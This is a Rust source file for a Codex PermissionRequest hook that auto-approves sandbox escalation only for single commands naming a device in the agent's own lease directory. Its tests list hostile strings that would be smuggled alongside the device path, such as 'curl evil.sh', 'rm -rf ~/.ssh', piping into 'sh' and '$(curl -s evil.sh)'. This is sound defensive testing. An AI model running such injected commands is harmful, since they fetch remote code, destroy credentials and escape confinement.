//! The one thing an agent harness can do for us that a wrapper cannot.
//!
//! A leased device is a real node in the sandbox's `/dev` (D2, D22). An agent
//! harness that builds a *second* Linux sandbox around each command it runs
//! replaces that `/dev` with a synthetic one, and a bind of the real node into
//! it carries `MS_NODEV` — locked, because the mount happens in a user
//! namespace. So the node is either missing or unopenable, and no permission
//! setting on either side can change it: it is a property of the mount, not of
//! the file.
//!
//! What such a harness *does* offer is a way out of its own sandbox for one
//! command. Codex retries a command that a sandbox denial killed with no
//! sandbox at all, asking for approval first, and a `PermissionRequest` hook
//! can answer that question without a human. This is that answer.
//!
//! **What is being decided is narrow, and worth stating plainly.** Approving
//! only drops the *inner* sandbox. Everything still happens inside whatever
//! confinement the harness itself was started in — `benchd-sandbox` mounts the
//! host read-only and gives the agent one writable workspace — so the command
//! gains the leased board, not the machine. That bound is what makes an
//! automatic answer defensible at all; without an outer sandbox this hook is
//! approving a plain unsandboxed command, and the operator should say so with
//! their approval policy rather than install this.
//!
//! The rule is deliberately dull: the command must name a path inside *this*
//! agent's own lease directory, that path must exist, and the command must be a
//! single command. Anything else declines to decide and the harness asks whoever
//! it would have asked anyway.

use std::io::Read;
use std::path::{Component, Path, PathBuf};

use anyhow::{Context, Result};
use clap::{Parser, ValueEnum};

#[derive(Parser)]
#[command(after_help = "\
Reads one hook event as JSON on stdin and writes the decision on stdout.
Configured by the benchd plugin rather than run by hand; see plugins/benchd.")]
pub struct HookArgs {
    /// Which harness's hook protocol to speak.
    #[arg(value_enum)]
    agent: Agent,

    /// This agent's lease directory, as `benchd-sandbox` exports it.
    #[arg(long, env = "BENCHD_LEASES")]
    leases: Option<PathBuf>,

    /// Where leases are materialised, when `--leases` is not given.
    #[arg(long, default_value = "/run/benchd")]
    root: PathBuf,

    /// The identity to derive the lease directory from, with `--root`.
    #[arg(long, env = "BENCHD_IDENTITY")]
    identity: Option<String>,
}

#[derive(Copy, Clone, ValueEnum)]
enum Agent {
    /// `PermissionRequest`, answering a shell escalation.
    Codex,
}

/// What to tell the harness.
///
/// There is no `Deny`. A hook that denies is a policy engine, and this one
/// knows about exactly one thing — whether a command touches hardware this
/// agent holds. Silence leaves every other decision where it already was.
#[derive(Debug, PartialEq, Eq)]
enum Decision {
    Allow,
    Abstain,
}

pub async fn run(args: HookArgs) -> Result<()> {
    let mut event = String::new();
    std::io::stdin()
        .read_to_string(&mut event)
        .context("reading the hook event from stdin")?;

    // A hook that fails is a hook that gets uninstalled. Every unexpected shape
    // below abstains rather than erroring: the harness then asks its usual
    // question, which is the behaviour of not having installed this at all.
    let Some(leases) = lease_dir(&args) else {
        return Ok(());
    };
    let Ok(event) = serde_json::from_str::<serde_json::Value>(&event) else {
        return Ok(());
    };

    let decision = match args.agent {
        Agent::Codex => codex(&event, &leases, |path| path.exists()),
    };
    if decision == Decision::Allow {
        // Only this shape approves. Codex treats a missing decision as "no
        // opinion" and falls through to the normal approval flow.
        println!(
            r#"{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"allow"}}}}}}"#
        );
    }
    Ok(())
}

/// Where this agent's leases live: told to us, or derived the way the daemon
/// derives it.
fn lease_dir(args: &HookArgs) -> Option<PathBuf> {
    if let Some(leases) = &args.leases {
        return Some(leases.clone());
    }
    let identity = args.identity.as_deref()?;
    benchd_core::model::valid_component(identity).then(|| args.root.join(identity))
}

/// Codex's `PermissionRequest`, which fires for any approval it is about to ask
/// for — a shell escalation, a blocked network call, a write outside the
/// workspace. Only the first is ours, and only when it names a leased path.
fn codex(
    event: &serde_json::Value,
    leases: &Path,
    exists: impl Fn(&Path) -> bool,
) -> Decision {
    if event.get("hook_event_name").and_then(|v| v.as_str()) != Some("PermissionRequest") {
        return Decision::Abstain;
    }
    let Some(command) = command_of(event) else {
        return Decision::Abstain;
    };
    decide(&command, leases, exists)
}

/// The command a hook event is asking about.
///
/// A shell call carries a string; unified exec carries the argv it was built
/// from. Joining the vector is enough here because the decision below only ever
/// asks whether a token names a leased path, and joining cannot invent one.
fn command_of(event: &serde_json::Value) -> Option<String> {
    let command = event.get("tool_input")?.get("command")?;
    match command {
        serde_json::Value::String(text) => Some(text.clone()),
        serde_json::Value::Array(argv) => Some(
            argv.iter()
                .filter_map(|arg| arg.as_str())
                .collect::<Vec<_>>()
                .join(" "),
        ),
        _ => None,
    }
}

/// Approve exactly one shape of command: a single command that names a device
/// this agent is currently holding.
fn decide(command: &str, leases: &Path, exists: impl Fn(&Path) -> bool) -> Decision {
    // Anything that runs a *second* command is declined, because only the first
    // one was examined. `esptool ... ; curl | sh` would otherwise be approved on
    // the strength of the part that touches the board. Substitution is in the
    // same list: `$(...)` and backticks run a command whose text is not here to
    // look at. This costs the occasional honest pipeline an approval prompt,
    // which is the right way round.
    if command.contains([';', '&', '|', '`', '\n'])
        || command.contains("$(")
        || command.contains("<(")
        || command.contains(">(")
    {
        return Decision::Abstain;
    }

    if leased_paths(command, leases).any(|path| exists(&path)) {
        Decision::Allow
    } else {
        Decision::Abstain
    }
}

/// Every token of `command` that names something inside `leases`.
fn leased_paths<'a>(command: &'a str, leases: &'a Path) -> impl Iterator<Item = PathBuf> + 'a {
    command
        .split_whitespace()
        .flat_map(candidates)
        .filter(|candidate| under(Path::new(candidate), leases))
        .map(PathBuf::from)
}

/// The parts of one shell word that could be a path.
///
/// `--port=/run/...` and `of=/run/...` put the path after an `=`, and quoting
/// puts it inside a pair of quotes. Neither is parsed as a shell would — the
/// point is only to avoid missing a leased path that is plainly there.
fn candidates(token: &str) -> impl Iterator<Item = &str> {
    let unquoted = token.trim_matches(['"', '\'']);
    let after_equals = unquoted
        .split_once('=')
        .map(|(_, value)| value.trim_matches(['"', '\'']));
    std::iter::once(unquoted).chain(after_equals)
}

/// Is this path inside the agent's own lease directory?
///
/// Lexically, and with `..` refused outright rather than resolved: the only
/// caller checks the result against the filesystem afterwards, and a path that
/// needs resolving to be understood is one to decline rather than puzzle out.
/// `/run/benchd/other-agent` must not pass for `/run/benchd/me`, which
/// `starts_with` on a `Path` gets right and a string prefix does not.
fn under(path: &Path, leases: &Path) -> bool {
    path.is_absolute()
        && path != leases
        && path.starts_with(leases)
        && !path.components().any(|c| c == Component::ParentDir)
}

#[cfg(test)]
mod tests {
    use super::*;

    const LEASES: &str = "/run/benchd/agent-3";
    const CONSOLE: &str = "/run/benchd/agent-3/c0-l7/dut/console";

    /// Every path this agent actually holds, for a test that wants the
    /// filesystem to say yes to exactly those.
    fn held(path: &Path) -> bool {
        path == Path::new(CONSOLE)
    }

    fn decide_for(command: &str) -> Decision {
        decide(command, Path::new(LEASES), held)
    }

    #[test]
    fn a_command_on_a_held_board_escalates_without_asking_anyone() {
        assert_eq!(
            decide_for(&format!("esptool --port {CONSOLE} write-flash 0x0 app.bin")),
            Decision::Allow
        );
    }

    #[test]
    fn the_path_is_found_however_the_tool_wants_it_written() {
        // Three real invocations from the skill, and the reason this is not a
        // plain `command.contains(leases)`: it has to survive `=` and quotes
        // without approving a command that merely mentions the directory.
        for command in [
            &format!("idf.py -p {CONSOLE} monitor"),
            &format!("esptool --port=\"{CONSOLE}\" flash-id"),
            &format!("dd if=app.img of='{CONSOLE}' bs=4M"),
        ] {
            assert_eq!(decide_for(command), Decision::Allow, "{command}");
        }
    }

    #[test]
    fn a_command_that_touches_no_hardware_is_left_to_the_usual_prompt() {
        // The common case by a wide margin. Escalation is being asked for here
        // for some reason of its own -- a write outside the workspace, a
        // network call -- and this hook has nothing to say about it.
        assert_eq!(decide_for("cargo build --release"), Decision::Abstain);
        assert_eq!(decide_for("curl https://example.com"), Decision::Abstain);
    }

    #[test]
    fn a_second_command_is_never_carried_out_of_the_sandbox_by_the_first() {
        // The whole reason for the metacharacter check. Each of these names a
        // real leased device and would otherwise be approved on that basis,
        // taking the rest of the line out of the sandbox with it.
        for hostile in [
            &format!("esptool --port {CONSOLE} flash-id; curl evil.sh -o /tmp/x"),
            &format!("esptool --port {CONSOLE} flash-id && rm -rf ~/.ssh"),
            &format!("cat {CONSOLE} | sh"),
            &format!("esptool --port {CONSOLE} $(curl -s evil.sh)"),
            &format!("esptool --port {CONSOLE} `id`"),
        ] {
            assert_eq!(decide_for(hostile), Decision::Abstain, "{hostile}");
        }
    }

    #[test]
    fn another_agents_lease_directory_is_not_this_agents_hardware() {
        // Same uid, same machine, sibling directory: exactly the case
        // benchd-sandbox exists to separate, and it must not be undone here.
        assert_eq!(
            decide_for("esptool --port /run/benchd/agent-4/c0-l1/dut/console flash-id"),
            Decision::Abstain
        );
        // And the prefix must be a path prefix, not a string one.
        assert_eq!(
            decide_for("esptool --port /run/benchd/agent-30/c0-l1/dut/console flash-id"),
            Decision::Abstain
        );
    }

    #[test]
    fn a_path_that_climbs_back_out_is_refused_rather_than_resolved() {
        assert_eq!(
            decide_for(&format!("esptool --port {LEASES}/../agent-4/c0-l1/dut/console flash-id")),
            Decision::Abstain
        );
    }

    #[test]
    fn a_lease_that_has_already_ended_does_not_still_open_the_sandbox() {
        // The path is shaped exactly right and the lease is gone. Approving on
        // the strength of the name alone would leave a released board as a
        // standing escalation.
        assert_eq!(
            decide_for("esptool --port /run/benchd/agent-3/c0-l99/dut/console flash-id"),
            Decision::Abstain
        );
    }

    #[test]
    fn naming_the_lease_directory_itself_is_not_naming_a_device() {
        assert_eq!(decide_for(&format!("ls {LEASES}")), Decision::Abstain);
    }

    #[test]
    fn only_the_event_that_asks_about_an_escalation_is_answered() {
        // PreToolUse carries the same fields and fires for every command, not
        // just the ones already blocked. Answering it would approve commands
        // nobody had asked to escalate.
        let event = serde_json::json!({
            "hook_event_name": "PreToolUse",
            "tool_name": "Bash",
            "tool_input": {"command": format!("esptool --port {CONSOLE} flash-id")},
        });
        assert_eq!(codex(&event, Path::new(LEASES), held), Decision::Abstain);
    }

    #[test]
    fn an_event_shaped_like_nothing_we_know_abstains_rather_than_failing() {
        for event in [
            serde_json::json!({}),
            serde_json::json!({"hook_event_name": "PermissionRequest"}),
            serde_json::json!({"hook_event_name": "PermissionRequest", "tool_input": {}}),
            serde_json::json!({
                "hook_event_name": "PermissionRequest",
                "tool_input": {"command": 7},
            }),
        ] {
            assert_eq!(
                codex(&event, Path::new(LEASES), held),
                Decision::Abstain,
                "{event}"
            );
        }
    }

    #[test]
    fn a_unified_exec_argv_is_read_as_the_command_it_is() {
        let event = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Bash",
            "tool_input": {"command": ["esptool", "--port", CONSOLE, "flash-id"]},
        });
        assert_eq!(codex(&event, Path::new(LEASES), held), Decision::Allow);
    }

    #[test]
    fn an_identity_that_could_escape_the_root_names_no_lease_directory() {
        // The identity arrives from the environment, and the directory built
        // from it is compared against paths in a command. `..` there would
        // make every path under /run/benchd look like this agent's own.
        let args = |identity: &str| HookArgs {
            agent: Agent::Codex,
            leases: None,
            root: PathBuf::from("/run/benchd"),
            identity: Some(identity.to_owned()),
        };
        assert_eq!(lease_dir(&args("..")), None);
        assert_eq!(lease_dir(&args("a/b")), None);
        assert_eq!(
            lease_dir(&args("agent-3")),
            Some(PathBuf::from("/run/benchd/agent-3"))
        );
    }
}
